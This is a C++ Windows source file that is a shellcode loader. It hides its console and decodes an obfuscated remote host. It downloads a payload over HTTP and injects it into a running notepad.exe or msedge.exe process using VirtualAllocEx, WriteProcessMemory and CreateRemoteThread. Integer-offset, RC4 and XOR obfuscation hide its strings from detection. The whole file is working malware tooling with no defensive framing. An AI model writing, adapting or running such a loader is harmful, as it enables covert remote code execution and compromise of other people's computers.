#include <windows.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment (lib, "Wininet.lib")

struct Shellcode {
    BYTE* pcData;
    DWORD dwSize;
};

DWORD GetTargetPID();
BOOL Download(LPCWSTR host, INTERNET_PORT port, BOOL bSecure, Shellcode* shellcode);
BOOL Inject(DWORD dwPID, Shellcode shellcode);

wchar_t* deobf_int_array(const int* arr, size_t len, int const_val) {
    wchar_t* str = new wchar_t[len + 1];
    for (size_t i = 0; i < len; i++) {
        str[i] = (wchar_t)(arr[i] - const_val);
    }
    str[len] = 0;
    return str;
}

long parse_val(const wchar_t* s) {
    if (wcsncmp(s, L"&H", 2) == 0) {
        return wcstol(s + 2, NULL, 16);
    }
    else {
        return wcstol(s, NULL, 10);
    }
}

void rc4(unsigned char* key, size_t keylen, unsigned char* data, size_t datalen) {
    unsigned char s[256];
    for (size_t i = 0; i < 256; i++) s[i] = (unsigned char)i;
    size_t j = 0;
    for (size_t i = 0; i < 256; i++) {
        j = (j + s[i] + key[i % keylen]) % 256;
        unsigned char temp = s[i];
        s[i] = s[j];
        s[j] = temp;
    }
    size_t i = 0; j = 0;
    for (size_t k = 0; k < datalen; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        unsigned char temp = s[i];
        s[i] = s[j];
        s[j] = temp;
        data[k] ^= s[(s[i] + s[j]) % 256];
    }
}

void xor_obfuscate(BYTE* data, DWORD size, BYTE key) {
    for (DWORD i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

int main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    DWORD pid = GetTargetPID();
    if (pid == 0) {
        OutputDebugString(L"[-] Failed to find target PID\n");
        return 1;
    }

    int host_arr[] = { 44635, 44636, 44646, 44582, 44652, 44650, 44633, 44636, 44637, 44581, 44641, 44636, 44637, 44633, 44651, 44582, 44635, 44647 };
    LPCWSTR host = deobf_int_array(host_arr, sizeof(host_arr) / sizeof(int), 44536);

    struct Shellcode shellcode;
    if (!Download(host, 443, FALSE, &shellcode)) {
        OutputDebugString(L"[-] Download failed\n");
        delete[] host;
        return 2;
    }

    delete[] host;

    if (!Inject(pid, shellcode)) {
        OutputDebugString(L"[-] Injection failed\n");
        return 3;
    }

    return 0;
}

BOOL Download(LPCWSTR host, INTERNET_PORT port, BOOL bSecure, Shellcode* shellcode) {
    unsigned char ua_enc[] = { 0x1B, 0x66, 0xEA, 0x6E, 0x0E, 0x44, 0xD4, 0x66, 0xE6, 0xD0, 0x8B, 0x98, 0x3D, 0x0C, 0xFF, 0xC5, 0xF4, 0xBF, 0x35, 0xD3, 0xCE, 0xBC, 0x0A, 0x26, 0x0F, 0x51, 0x92, 0x2F, 0x75, 0x9C, 0xFA, 0x73, 0x0E, 0x8A, 0x61, 0xC0, 0xB5, 0xD9, 0x9A, 0x88, 0x90, 0x21, 0xA2, 0x61, 0x38, 0xDD, 0xDA, 0x41, 0x1A, 0x5C, 0x52, 0xDA, 0x54, 0x55, 0xD2, 0xF0, 0x15, 0x3C, 0x78, 0xCD, 0xCC, 0xEE, 0xD1, 0x79, 0xF9, 0x38, 0x6F, 0xBA, 0xF4, 0xC2, 0x89, 0x4E, 0xD3, 0x24, 0x8B, 0x91, 0x01, 0xA3, 0x7D, 0xC5, 0xE0, 0xAD, 0x79, 0x4F, 0x1F, 0x0B, 0x10, 0x39, 0x30, 0x85, 0x6A, 0xAE, 0x85, 0x91, 0x0A, 0x98, 0x72, 0x1B, 0x5B, 0x89, 0xCF, 0xA6, 0xD4, 0x13, 0xF2, 0xB8, 0xD2, 0xC1, 0xEC, 0x1D, 0x65, 0xB7, 0xF4, 0x31, 0xDC, 0x07, 0x39, 0x8E, 0x88, 0x8C, 0xA5, 0xC6, 0x10, 0x9C, 0xAF, 0xA3, 0x3D, 0x9B, 0xD1, 0xF6, 0xA6, 0x51, 0xB4, 0x12, 0xC2, 0x35, 0x6F, 0xAB, 0xD3, 0xEC, 0x19, 0x79, 0x84, 0x20, 0x87, 0x64, 0xC5, 0xF9, 0x8B, 0xA3, 0xB1, 0x57, 0x83, 0xFD, 0x97, 0xCD, 0x92, 0x40, 0xC0, 0x8E, 0xFC, 0xBE, 0xE8, 0x07, 0xD1, 0x94, 0x07, 0x5F, 0x1F, 0x0F, 0x53, 0x3C, 0x61, 0x1D, 0x4B, 0x5F, 0xDD, 0x3B, 0x9E, 0xED, 0x50, 0x08, 0xBE, 0xDE, 0x29, 0xF2, 0x23, 0x70, 0xE3, 0xF7, 0x0D, 0x6E, 0xAC, 0xBE, 0x07, 0xDF, 0xF3, 0xDB, 0xD9, 0x1B, 0xE4, 0xB8, 0xC6, 0x10, 0xFF, 0xE8, 0x06, 0xC2, 0x8F, 0x9B, 0x22, 0x14, 0x40, 0xFA, 0xDC, 0xD7, 0x42, 0x8B, 0xBF, 0xC1, 0x11, 0xBA };
    size_t ua_len = 222;
    unsigned char* ua_data = new unsigned char[ua_len];
    memcpy(ua_data, ua_enc, ua_len);
    rc4((unsigned char*)"mykey", 5, ua_data, ua_len);
    LPCWSTR ua = (LPCWSTR)ua_data;

    HINTERNET session = InternetOpen(ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    delete[] ua_data;
    if (!session) {
        OutputDebugString(L"[-] InternetOpen failed\n");
        return 0;
    }

    HINTERNET connection = InternetConnect(session, host, port, L"", L"", INTERNET_SERVICE_HTTP, 0, 0);
    if (!connection) {
        OutputDebugString(L"[-] InternetConnect failed\n");
        InternetCloseHandle(session);
        return 0;
    }

    DWORD dwFlags = bSecure ? INTERNET_FLAG_SECURE : 0;
    wchar_t path[10];
    path[0] = 200 - (wchar_t)parse_val(L"&H99");
    path[1] = 200 - (wchar_t)parse_val(L"&H54");
    path[2] = 200 - (wchar_t)parse_val(L"&H63");
    path[3] = 200 - (wchar_t)parse_val(L"&H55");
    path[4] = 200 - (wchar_t)parse_val(L"&H54");
    path[5] = 200 - (wchar_t)parse_val(L"&H9A");
    path[6] = 200 - (wchar_t)parse_val(L"&H54");
    path[7] = 200 - (wchar_t)parse_val(L"&H54");
    path[8] = 200 - (wchar_t)parse_val(L"&H62");
    path[9] = 0;

    int method_arr[] = { 44639, 44637, 44652 };
    LPCWSTR method = deobf_int_array(method_arr, sizeof(method_arr) / sizeof(int), 44536);

    HINTERNET request = HttpOpenRequest(connection, method, path, NULL, NULL, NULL, dwFlags, 0);
    delete[] method;
    if (!request) {
        OutputDebugString(L"[-] HttpOpenRequest failed\n");
        InternetCloseHandle(connection);
        InternetCloseHandle(session);
        return 0;
    }

    WORD counter = 0;
    while (!HttpSendRequest(request, NULL, 0, 0, 0)) {
        counter++;
        Sleep(3000);
        if (counter >= 3) {
            OutputDebugString(L"[-] HttpSendRequest failed after retries\n");
            InternetCloseHandle(request);
            InternetCloseHandle(connection);
            InternetCloseHandle(session);
            return 0;
        }
    }

    DWORD bufSize = BUFSIZ;
    BYTE* buffer = new BYTE[bufSize];
    DWORD capacity = bufSize;
    BYTE* payload = (BYTE*)malloc(capacity);
    DWORD payloadSize = 0;

    while (true) {
        DWORD bytesRead;
        if (!InternetReadFile(request, buffer, bufSize, &bytesRead)) {
            OutputDebugString(L"[-] InternetReadFile failed\n");
            free(payload);
            delete[] buffer;
            InternetCloseHandle(request);
            InternetCloseHandle(connection);
            InternetCloseHandle(session);
            return 0;
        }

        if (bytesRead == 0) break;

        if (payloadSize + bytesRead > capacity) {
            capacity *= 2;
            BYTE* newPayload = (BYTE*)realloc(payload, capacity);
            if (newPayload == NULL) {
                OutputDebugString(L"[-] realloc failed\n");
                free(payload);
                delete[] buffer;
                InternetCloseHandle(request);
                InternetCloseHandle(connection);
                InternetCloseHandle(session);
                return 0;
            }
            payload = newPayload;
        }

        for (DWORD i = 0; i < bytesRead; i++) {
            payload[payloadSize++] = buffer[i];
        }
    }

    BYTE* newPayload = (BYTE*)realloc(payload, payloadSize);
    if (newPayload == NULL) {
        OutputDebugString(L"[-] Final realloc failed\n");
        free(payload);
        delete[] buffer;
        InternetCloseHandle(request);
        InternetCloseHandle(connection);
        InternetCloseHandle(session);
        return 0;
    }
    payload = newPayload;

    // Obfuscation: Apply constant subtraction and RC4
    int const_sub = 44536 % 256;
    for (DWORD i = 0; i < payloadSize; i++) {
        payload[i] = (BYTE)((DWORD)payload[i] - const_sub);
    }
    rc4((unsigned char*)"payloadkey", 10, payload, payloadSize);

    // Additional Obfuscation: XOR with a dynamic key
    BYTE xor_key = (BYTE)(payloadSize % 256);
    xor_obfuscate(payload, payloadSize, xor_key);

    InternetCloseHandle(request);
    InternetCloseHandle(connection);
    InternetCloseHandle(session);
    delete[] buffer;

    (*shellcode).pcData = payload;
    (*shellcode).dwSize = payloadSize;
    return 1;
}

DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize);
DWORD GetFirstPIDProcname(const WCHAR* szProcname);

DWORD GetTargetPID() {
    int notepad_arr[] = { 44646, 44647, 44652, 44637, 44648, 44633, 44636, 44582, 44637, 44656, 44637 };
    int msedge_arr[] = { 44645, 44651, 44637, 44636, 44639, 44637, 44582, 44637, 44656, 44637 };
    const WCHAR* aszProclist[2] = {
        deobf_int_array(notepad_arr, sizeof(notepad_arr) / sizeof(int), 44536),
        deobf_int_array(msedge_arr, sizeof(msedge_arr) / sizeof(int), 44536)
    };
    DWORD pid = GetFirstPIDProclist(aszProclist, sizeof(aszProclist) / sizeof(aszProclist[0]));

    delete[] aszProclist[0];
    delete[] aszProclist[1];
    return pid;
}

DWORD GetFirstPIDProclist(const WCHAR** aszProclist, DWORD dwSize) {
    DWORD pid = 0;
    for (int i = 0; i < dwSize; i++) {
        pid = GetFirstPIDProcname(aszProclist[i]);
        if (pid > 0) {
            return pid;
        }
    }
    return 0;
}

DWORD GetFirstPIDProcname(const WCHAR* szProcname) {
    HANDLE hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcessSnapshot) {
        OutputDebugString(L"[-] CreateToolhelp32Snapshot failed\n");
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnapshot, &pe32)) {
        OutputDebugString(L"[-] Process32First failed\n");
        CloseHandle(hProcessSnapshot);
        return 0;
    }

    DWORD pid = 0;
    while (Process32Next(hProcessSnapshot, &pe32)) {
        if (lstrcmpiW(szProcname, pe32.szExeFile) == 0) {
            pid = pe32.th32ProcessID;
            wchar_t debugMsg[256];
            swprintf(debugMsg, 256, L"[+] Process found: %d %ls\n", pid, pe32.szExeFile);
            OutputDebugString(debugMsg);
            break;
        }
    }

    CloseHandle(hProcessSnapshot);
    return pid;
}

BOOL Inject(DWORD dwPID, Shellcode shellcode) {
    // Reverse obfuscation: XOR and RC4
    BYTE xor_key = (BYTE)(shellcode.dwSize % 256);
    xor_obfuscate(shellcode.pcData, shellcode.dwSize, xor_key);
    rc4((unsigned char*)"payloadkey", 10, shellcode.pcData, shellcode.dwSize);

    // Reverse constant subtraction
    int const_sub = 44536 % 256;
    for (DWORD i = 0; i < shellcode.dwSize; i++) {
        shellcode.pcData[i] = (BYTE)((DWORD)shellcode.pcData[i] + const_sub);
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, dwPID);
    if (!hProcess) {
        wchar_t debugMsg[256];
        swprintf(debugMsg, 256, L"[-] OpenProcess failed for PID %d: %d\n", dwPID, GetLastError());
        OutputDebugString(debugMsg);
        return 0;
    }

    LPVOID pRemoteAddr = VirtualAllocEx(hProcess, NULL, shellcode.dwSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pRemoteAddr) {
        wchar_t debugMsg[256];
        swprintf(debugMsg, 256, L"[-] VirtualAllocEx failed: %d\n", GetLastError());
        OutputDebugString(debugMsg);
        CloseHandle(hProcess);
        return 0;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pRemoteAddr, shellcode.pcData, shellcode.dwSize, &bytesWritten) || bytesWritten != shellcode.dwSize) {
        wchar_t debugMsg[256];
        swprintf(debugMsg, 256, L"[-] WriteProcessMemory failed: %d, Bytes Written: %zu\n", GetLastError(), bytesWritten);
        OutputDebugString(debugMsg);
        VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
    if (!hThread) {
        wchar_t debugMsg[256];
        swprintf(debugMsg, 256, L"[-] CreateRemoteThread failed: %d\n", GetLastError());
        OutputDebugString(debugMsg);
        VirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 0;
    }

    WaitForSingleObject(hThread, 500);
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    if (exitCode != STILL_ACTIVE) {
        wchar_t debugMsg[256];
        swprintf(debugMsg, 256, L"[-] Remote thread terminated with code: %d\n", exitCode);
        OutputDebugString(debugMsg);
    }
    else {
        OutputDebugString(L"[+] Injection successful\n");
    }

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 1;
}